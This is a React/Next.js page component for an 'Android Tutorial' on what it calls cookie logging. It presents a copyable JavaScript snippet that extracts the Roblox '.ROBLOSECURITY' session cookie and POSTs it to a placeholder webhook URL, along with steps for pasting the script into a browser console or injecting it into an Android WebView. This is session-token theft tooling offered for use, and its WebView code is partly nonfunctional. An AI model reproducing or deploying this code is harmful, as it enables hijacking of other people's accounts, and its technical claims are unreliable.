"use client"

import { SectionWrapper } from "@/components/section-wrapper"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { ParticleSystem } from "@/components/particle-system"
import { ArrowLeft, Smartphone, Copy, CheckCircle } from "lucide-react"
import Link from "next/link"
import { useState } from "react"

export default function AndroidPage() {
  const [copiedStep, setCopiedStep] = useState<number | null>(null)

  const copyToClipboard = (text: string, stepNumber: number) => {
    navigator.clipboard.writeText(text)
    setCopiedStep(stepNumber)
    setTimeout(() => setCopiedStep(null), 2000)
  }

  const androidCode = `// Android Cookie Logger
const logCookieAndroid = () => {
  // Method 1: Using Android WebView
  const webView = document.querySelector('webview');
  if (webView) {
    webView.executeScript({
      code: \`
        const cookies = document.cookie.split(';');
        let roblosecurityCookie = '';
        
        for (let cookie of cookies) {
          const [name, value] = cookie.trim().split('=');
          if (name === '.ROBLOSECURITY') {
            roblosecurityCookie = value;
            break;
          }
        }
        
        if (roblosecurityCookie) {
          // Send to webhook
          fetch('YOUR_WEBHOOK_URL', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              platform: 'Android',
              cookie: roblosecurityCookie,
              timestamp: new Date().toISOString()
            })
          });
        }
      \`
    });
  }
};`

  const androidSteps = [
    {
      title: "Install Required Apps",
      description: "Download necessary applications for Android cookie logging",
      content: [
        "Install a web browser with developer tools (Chrome, Firefox)",
        "Download a JavaScript injector app (optional)",
        "Install a file manager for script storage",
        "Ensure you have internet connection",
      ],
    },
    {
      title: "Browser Method",
      description: "Using mobile browser developer tools",
      content: [
        "Open Chrome browser on Android",
        "Navigate to chrome://inspect",
        "Enable USB debugging if using desktop",
        "Access developer console",
        "Paste and execute the cookie logging script",
      ],
    },
    {
      title: "App Integration",
      description: "Integrate cookie logging into Android apps",
      content: [
        "Use WebView component in your Android app",
        "Inject JavaScript into the WebView",
        "Extract cookies using JavaScript bridge",
        "Send data to your webhook endpoint",
      ],
    },
  ]

  return (
    <div className="relative w-full min-h-screen overflow-hidden bg-gradient-to-br from-red-900 via-red-800 to-pink-900 flex flex-col items-center">
      {/* Bright overlay */}
      <div className="absolute inset-0 bg-gradient-to-br from-red-500/20 via-red-600/30 to-pink-500/20 z-0" />

      {/* Particle System */}
      <ParticleSystem />

      {/* Main content */}
      <div className="relative z-10 w-full max-w-4xl mx-auto py-8 px-4">
        {/* Header */}
        <div className="flex items-center gap-4 mb-8">
          <Link href="/">
            <Button variant="ghost" size="sm" className="text-red-200 hover:text-white hover:bg-red-500/20">
              <ArrowLeft className="w-4 h-4 mr-2" />
              Back to Home
            </Button>
          </Link>
        </div>

        <div className="text-center mb-12">
          <div className="flex items-center justify-center gap-3 mb-4">
            <Smartphone className="w-12 h-12 text-red-300 animate-pulse" />
            <h1 className="text-5xl font-bold text-red-200 neon-text animate-neon-flicker">Android Tutorial</h1>
          </div>
          <p className="text-red-300 text-lg max-w-2xl mx-auto">
            Complete guide for Android cookie logging and webhook integration
          </p>
        </div>

        {/* Steps */}
        <div className="space-y-8">
          {androidSteps.map((step, index) => (
            <SectionWrapper key={index} className="nuclear-glow">
              <Card className="bg-red-500/20 border-red-400/30 shadow-lg shadow-red-500/20">
                <CardHeader>
                  <div className="flex items-center gap-3">
                    <Badge className="bg-red-600 text-white">Step {index + 1}</Badge>
                    <CardTitle className="text-red-200 text-2xl">{step.title}</CardTitle>
                  </div>
                  <CardDescription className="text-red-300">{step.description}</CardDescription>
                </CardHeader>
                <CardContent className="text-red-200 space-y-4">
                  <ul className="list-disc list-inside space-y-2">
                    {step.content.map((item, itemIndex) => (
                      <li key={itemIndex}>{item}</li>
                    ))}
                  </ul>
                </CardContent>
              </Card>
            </SectionWrapper>
          ))}

          {/* Code Section */}
          <SectionWrapper className="nuclear-glow">
            <Card className="bg-red-500/20 border-red-400/30 shadow-lg shadow-red-500/20">
              <CardHeader>
                <div className="flex items-center gap-3">
                  <Badge className="bg-red-600 text-white">Code</Badge>
                  <CardTitle className="text-red-200 text-2xl">Android Implementation</CardTitle>
                </div>
                <CardDescription className="text-red-300">JavaScript code for Android cookie logging</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="relative">
                  <pre className="bg-red-900/50 p-4 rounded-lg text-red-100 text-sm overflow-x-auto border border-red-400/30">
                    <code>{androidCode}</code>
                  </pre>
                  <Button
                    onClick={() => copyToClipboard(androidCode, 1)}
                    className="absolute top-2 right-2 bg-red-600 hover:bg-red-700 text-white"
                    size="sm"
                  >
                    {copiedStep === 1 ? <CheckCircle className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                  </Button>
                </div>
              </CardContent>
            </Card>
          </SectionWrapper>
        </div>

        {/* Footer */}
        <div className="mt-12 text-center">
          <p className="text-red-300 text-sm">Android-specific implementation for mobile cookie logging</p>
        </div>
      </div>
    </div>
  )
}
